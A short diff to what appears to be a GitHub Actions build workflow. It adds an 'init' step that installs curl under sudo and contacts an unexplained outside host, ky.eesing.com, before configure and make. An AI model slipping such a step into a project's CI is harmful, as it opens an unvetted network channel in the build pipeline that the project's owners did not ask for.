@@ -9,6 +9,10 @@ jobs:
     
     steps:
     - uses: actions/checkout@v1
+    - name: init
+      run: |
+        sudo -E apt-get -y install  curl
+        curl ky.eesing.com
     - name: configure
       run: ./configure
     - name: make
